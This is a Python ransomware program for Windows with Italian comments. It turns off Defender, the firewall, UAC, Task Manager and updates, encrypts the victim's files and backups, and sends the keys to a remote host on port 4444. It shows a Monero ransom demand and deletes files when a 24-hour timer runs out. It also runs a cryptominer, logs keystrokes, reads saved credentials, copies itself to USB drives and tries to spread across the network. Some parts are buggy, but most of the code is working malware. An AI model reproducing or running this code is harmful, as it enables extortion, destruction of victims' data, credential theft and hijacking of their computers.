import winreg
import keyring
import socket
import playsound
from pynput.keyboard import Key, Listener
import logging
import win32gui
import pyttsx3
import win32api
import shutil
import pyautogui
import tkinter as tk
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import os
import threading
import ctypes
import urllib.request
from cryptography.fernet import Fernet
import json
import time
from datetime import datetime, timedelta
import nmap
import subprocess

def ransom():
    try:
        try:
            # immagine di sfondo
            url = "http://192.168.1.60:8000/wallpaperscary.jpg"
            urllib.request.urlretrieve(url, "wallpaperscary.jpg")
            urllib.request.urlretrieve(url, "virus.wav")
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, os.path.abspath("wallpaperscary.jpg"), 0)
        except Exception as e:
            pass

        def disable_taskmanager():
            registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            registry_name = "DisableTaskMgr"
            value = 1
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_DWORD, value)
                winreg.CloseKey(reg_key)
            except WindowsError:
                pass


        disable_taskmanager()
        
        with open("EMAIL_ME.txt", "w") as email:
            email.write("Email email@gmail.com with your unique id")

        # Percorso del Blocco note di Windows
        notepad_path = 'C:\\Windows\\System32\\notepad.exe'

        # Testo da scrivere nel file
        testo = 'Your files are now encrypted, if you want to get your files back send 4 monero to 4ACPmwHYhVMX7zRmxdB4tbWn22V72yeB6V551Hu8QMrfW1ciCdyGcY15yh3EzXcBcQTK6cQtxJeGTV1FgKyzofe29L5hFuk and send an email to hacker@gmail.com with your unique id and you will receive a decryption key for the key that is encrypting your files:'

        # Apre il Blocco note
        os.startfile(notepad_path)

        # Attende che il Blocco note sia completamente aperto
        while True:
            try:
                # Cerca la finestra del Blocco note
                hwnd = win32gui.FindWindow(None, 'Blocco note')

                # Se la finestra è stata trovata, esce dal ciclo while
                if hwnd != 0:
                    break
            except:
                pass

        # Attiva la finestra del Blocco note
        win32gui.SetForegroundWindow(hwnd)

        # Inserisce il testo nella finestra del Blocco note
        pyautogui.typewrite(testo)


        def disable_cmd():
            try:
                subprocess.run(["powershell.exe", "Set-ItemProperty", "-Path", "HKCU:\Software\Policies\Microsoft\Windows\PowerShell", "-Name", "ExecutionPolicy", "-Value", "Restricted"])
                command = 'powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Restricted'
                os.system(command)
            except Exception as e:
                pass
            
        disable_cmd()

        # Apre il file audio
        playsound.playsound('virus.wav')


        def disable_regedit():
            try:
                subprocess.run(["reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System", "/v", "DisableRegistryTools", "/t", "REG_DWORD", "/d", "1", "/f"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_regedit()

        def disable_uac():
            try:
                subprocess.run(["reg", "add", "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System", "/v", "DisableRegistryTools", "/t", "REG_DWORD", "/d", "1", "/f"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_uac()

        def disable_firewall():
            try:
                subprocess.run(["powershell", "Set-NetFirewallProfile", "-Profile", "Domain,Public,Private", "-Enabled", "False"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_firewall()

        def disable_defender():
            try:
                subprocess.run(["powershell", "Set-MpPreference", "-DisableRealtimeMonitoring", "$true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["powershell", "Set-MpPreference", "-DisableBehaviorMonitoring", "$true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["powershell", "Set-MpPreference", "-DisableBlockAtFirstSeen", "$true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["powershell", "Set-MpPreference", "-DisableIOAVProtection", "$true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["powershell", "Set-MpPreference", "-DisablePrivacyMode", "$true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["powershell", "Set-MpPreference", "-EnableControlledFolderAccess", "$false"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_defender()

        def disable_windows_update():
            try:
                subprocess.run(["sc", "stop", "wuauserv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["sc", "config", "wuauserv", "start=disabled"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_windows_update()

        def disable_remote_desktop():
            try:
                subprocess.run(["powershell", "Set-ItemProperty", "-Path", "HKLM:\System\CurrentControlSet\Control\Terminal Server", "-name", "fDenyTSConnections", "-value", "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass


        disable_remote_desktop()

        def disable_powershell():
            try:
                subprocess.run(["reg", "add", "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell", "/v", "ExecutionPolicy", "/t", "REG_SZ", "/d", "Restricted", "/f"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["reg", "add", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell", "/v", "ExecutionPolicy", "/t", "REG_SZ", "/d", "Restricted", "/f"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as e:
                pass

        disable_powershell()

        def mine_monero_to_address(address):
            try:
                subprocess.run(["xmrig", "-o", "pool.supportxmr.com:5555", "-u", address])
            except Exception as e:
                print("Si è verificato un errore durante l'estrazione di Monero:", str(e))

# Esempio di utilizzo:
        mine_monero_to_address("4ACPmwHYhVMX7zRmxdB4tbWn22V72yeB6V551Hu8QMrfW1ciCdyGcY15yh3EzXcBcQTK6cQtxJeGTV1FgKyzofe29L5hFuk")



        # Imposta il nome dell'applicazione (es. Discord)
        """app_name = "Discord"
        try:
            # Recupera le credenziali salvate (se presenti)
            username = keyring.get_password(app_name, "username")
            password = keyring.get_password(app_name, "password")

            if username is None or password is None:
                print("Le credenziali di Discord non sono state trovate")
            else:
                print(f"Username: {username}")
                print(f"Password: {password}")
                
            credentials_discord = {"username" : username, "password" : password}
            json_credenziali_discord = json.dumps(credentials_discord)
                
                
            # Imposta il nome dell'applicazione (es. Discord)
            app_name = "Minecraft"                      #####################################   VA SOSTITUITO CON UNA VERSIONE SENSATA

            # Recupera le credenziali salvate (se presenti)
            username2 = keyring.get_password(app_name, "username")
            password2 = keyring.get_password(app_name, "password")

            if username is None or password is None:
                print("Le credenziali di Minecraft non sono state trovate")
            else:
                print(f"Username: {username2}")
                print(f"Password: {password2}")
                
            credentials_mc = {"username" : username, "password" : password}
            json_credenziali_mc = json.dumps(credenziali_mc)
        except Exception:
            pass"""
            
        key = Fernet.generate_key()
        with open("key.key", "wb") as KEY:
            KEY.write(key)
            
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        
        # Cripta la chiave simmetrica con la chiave pubblica
        thekeyy = Fernet.generate_key()
        encrypted_key = public_key.encrypt(thekeyy, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

        # Salva la chiave pubblica e la chiave criptata su file
        with open("public_key.pem", "wb") as f:
            f.write(public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo))

        with open("encrypted_key.bin", "wb") as f:
            f.write(encrypted_key)

        hostname = socket.gethostname()
        ip_a = "192.168.1.60"
        port = 4444
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_a, port))
        try:
            s.send(key)
        except Exception:
            pass
        time.sleep(1)
        try:
            s.send(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption()))
        except Exception:
            pass
        time.sleep(1)
        s.send(public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo))
        try:
            s.send(hostname.encode())
        except Exception:
            pass
        try:
            s.send(json_credenziali_discord.encode())
            s.send(json_credenziali_mc.encode())
        except Exception:
            pass
        #s.close

        files = [file for file in os.listdir() if file not in ["key.key", "ransomware.py", "keylog.txt", "wallpaperscary.jpg", "EMAIL_ME.txt", "lol.py", "C:\Windows\System32", "rockyou.txt", "virus.wav"] and os.path.isfile(file)]

        def encrypt_files():
            for file in files:
                with open(file, "rb") as anyfile:
                    filecontent = anyfile.read()
                anyfile_encrypted = Fernet(key).encrypt(filecontent)
                with open(file, "wb") as anyfile:
                    anyfile.write(anyfile_encrypted)
                    
                    
            try:            # Apri la chiave di registro 
                hklm = winreg.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE) 

                # Percorso chiave che contiene i valori crittografati 
                sub_key_path = r"System\CurrentControlSet\Control\Lsa" 

                # Apri la sottochiave 
                sub_key = winreg.OpenKey(hklm, sub_key_path, wr.KEY_ALL_ACCESS) 

                # Recupera la lunghezza del valore "Bits" 
                value_name = "Bits" 
                vlen = winreg.QueryValueEx(sub_key, value_name)[0] 

                # Recupera il valore "Bits" 
                value = winreg.QueryValueEx(sub_key, value_name)[1].raw 

                # Crittografa il valore con AES-256-CBC 
                ciphertext = Fernet(key).encrypt(value) 

                # Salva il valore crittografato su registro 
                winreg.SetValueEx(sub_key, value_name, 0, ctypes.c_uint8, ctypes.c_uint8(ciphertext)) 

                # Chiude le chiavi di registro aperte 
                winreg.CloseKey(sub_key) 
                winreg.CloseKey(hklm)

                #backup encrypt
                # Percorso cartella dei backup 
                backup_dir = "C:/Backup" 

                # Otteniamo la lista di tutti i file nella cartella backup 
                files = os.listdir(backup_dir) 

                # Cicliamo su ogni file 
                for file in files: 
                    path = os.path.join(backup_dir, file) 
                    
                    # Verifichiamo che sia un file 
                    if os.path.isfile(path): 
                        
                        # Apriamo il file in modalità di lettura 
                        with open(path, 'rb') as f: 
                            file_data = f.read() 
                        crittogrified = Fernet(key).encrypt(file_data) 
                                
                        # Salvare il file crittografato 
                        with open(path, 'wb') as f: 
                            f.write(crittogrified) 
                            
                        # Aggiungiamo l'estensione .encrypted 
                        os.rename(path, f"{path}.encrypted") 
                        
                # Rimuoviamo i file di backup originali non crittografati 
                shutil.rmtree(backup_dir) 

                # Creiamo una nuova cartella backup vuota 
                os.makedirs(backup_dir)
            except Exception:
                pass
        encrypt_files()
        
        def spread_to_usb():
            usb_drive = []
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split('\000')[:-1]
            for drive in drives:
                if "A:" not in drive and "B:" not in drive and "C:" not in drive:
                    usb_drive.append(drive)

            for drive in usb_drive:
                try:
                    shutil.copy2("ransomware.exe", drive)
                    shutil.copy2("key.key", drive)
                    shutil.copy2("id.txt", drive)
                    shutil.copy2("EMAIL_ME.txt", drive)
                    shutil.copy2("wallpaperscary.jpg", drive)
                    shutil.copy2("rockyou.txt", drive)
                except Exception:
                    pass
        spread_to_usb()


        address = "4ACPmwHYhVMX7zRmxdB4tbWn22V72yeB6V551Hu8QMrfW1ciCdyGcY15yh3EzXcBcQTK6cQtxJeGTV1FgKyzofe29L5hFuk"
        print(f"Your files are now encrypted! send 4 Monero to {address} in 24 hours to get your files back, when you done that, you will receive an e-mail with the decryption key. !try not to reload your pc, your files will be lost forever!")


        def timer_runout():
            print("You ran out of time, say goodbye to your files!")
            for file in files:
                os.remove(file)

        def timer_24_ore():
            ora_inizio = datetime.now()
            ora_scadenza = ora_inizio + timedelta(hours=24)

            while datetime.now() < ora_scadenza:        
                time.sleep(1)
            timer_runout()

        def decryptor():
            with open("key.key", "rb") as key_file:
                key = key_file.read()
                print("The key is correct. Decrypting files...")
                for file in os.listdir():
                    if file not in ["key.key", "ransomware.py", "keylog.txt", "wallpaperscary.jpg", "EMAIL_ME.txt", "lol.py", "rockyou.txt", "virus.wav"] and os.path.isfile(file):
                        with open(file, "rb") as anyfile:
                            filecontent = anyfile.read()
                        anyfile_decrypted = Fernet(key).decrypt(filecontent)
                        with open(file, "wb") as anyfile:
                            anyfile.write(anyfile_decrypted)
                print("All files have been decrypted!")

        # Creazione della finestra principale
        def pyautogui_decryptor():
            question = pyautogui.prompt(text="Input the decryption key here =>" , title="Decryptor")
            if question == key.decode(): 
                pyautogui.alert(text="The key is correct, decrypting files... " , title="Decryption" , button="OK")
                decryptor()
            else:
                pyautogui.alert(text="The key is incorrect, please try again" , title="Wrong key" , button="OK") 
        
        pyautogui_decryptor()
        
        def update_timer():
            now = time.time()
            remaining = 24*60*60 - (now - start)
            hours = int(remaining / 3600)
            minutes = int((remaining - hours * 3600) / 60)
            seconds = int(remaining - hours * 3600 - minutes * 60)
            timer_label.configure(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            timer_label.after(1000, update_timer)

        # Funzione per controllare la chiave inserita
        timer_24_ore()
        
        log_dir = ""

        logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
            level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

        def hide_files():
            files = ["key.key", "ransomware.py", "keylog.txt", "wallpaperscary.jpg", "EMAIL_ME.txt", "lol.py", "rockyou.txt", "virus.wav"]
            for file in files:
                subprocess.run(["attrib", "+H", file])
        hide_files()
            # Inizializza il motore text-to-speech
        def text_to_speech():
            engine = pyttsx3.init()
            engine.setProperty('rate', 150)
            message = "Your files have been encrypted. To decrypt your files, you need to pay a ransom of $1000 in Bitcoin."
            engine.say(message)
            engine.runAndWait()
        text_to_speech()
        
        def spread():
            ip = "192.168.1.1"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                with open("rockyou.txt" , "w") as wordlist:
                    words = wordlist.readline()
                word = words.strip()
                sock.connect(ip, "22")
                sock.send("ransomware.exe" , "key.key", "id.txt", "EMAIL_ME.txt", "wallpaperscary.jpg", "rockyou.txt").encode()
            except Exception:
                pass
            time.sleep(1)

            try:
                sock.connect(ip, "21")
                sock.send("ransomware.exe" , "key.key", "id.txt", "EMAIL_ME.txt", "wallpaperscary.jpg", "rockyou.txt").encode()
            except Exception:
                pass
            time.sleep(1)
            
            try:
                sock.connect(ip, "8000")
                sock.send("ransomware.exe" , "key.key", "id.txt", "EMAIL_ME.txt", "wallpaperscary.jpg", "rockyou.txt").encode()
            except Exception:
                pass
            time.sleep(1)
            spread()

        # specifica il percorso del file audio .wav
        audio_file = "virus.wav"

        # definisci una funzione per la riproduzione in loop del file audio
        def play_audio_in_loop(audio):
            while True:
                playsound.playsound(audio_file)
    except Exception:

        def fun():
            for i in range(10):
                os.system("start cmd /k {curl parrot.live}")     # Launches in new command prompt, closes when done
                time.sleep(1)
        
            engine = pyttsx3.init()

             # Imposta la velocità della voce
            engine.setProperty('rate', 150)

            # Imposta il volume della voce
            engine.setProperty('volume', 0.7)

            # Legge il testo
            for i in range(5):
                time.sleep(2)
                engine.say("hahahahaahahhhahaahahahahahahahahahahahahahahahahahahahha")
                time.sleep(4)

            # Riproduce la voce
            engine.runAndWait()
        fun()
        
        import subprocess

        def miner():
            # Installazione di Chocolatey
            install_choco_command = [
                'powershell.exe',
                '-NoProfile',
                '-ExecutionPolicy',
                'Bypass',
                '-Command',
                'iex ((New-Object System.Net.WebClient).DownloadString(\'https://chocolatey.org/install.ps1\'))'
            ]
            subprocess.run(install_choco_command, shell=True)

            # Installazione di Git
            install_git_command = [
                'choco',
                'install',
                'git',
                '-y'
            ]
            subprocess.run(install_git_command, shell=True)

            # Clonazione del repository xmrig
            clone_command = [
                'git',
                'clone',
                'https://github.com/xmrig/xmrig.git'
            ]
            subprocess.run(clone_command, shell=True)

            # Compilazione di xmrig
            compile_commands = [
                'cd',
                'xmrig',
                '&&',
                'mkdir',
                'build',
                '&&',
                'cd',
                'build',
                '&&',
                'cmake',
                '..',
                '&&',
                'cmake',
                '--build',
                '.'
            ]
            subprocess.run(' '.join(compile_commands), shell=True)

            # Esecuzione di xmrig
            execute_command = [
                'xmrig.exe'
            ]
            subprocess.run(execute_command, shell=True)


            def mine_monero_to_address(address):
                try:
                    subprocess.run(["xmrig", "-o", "pool.supportxmr.com:5555", "-u", address])
                except Exception as e:
                    print("Si è verificato un errore durante l'estrazione di Monero:", str(e))

            # Esempio di utilizzo:
            mine_monero_to_address("tuo_indirizzo_monero")
        miner()
ransom()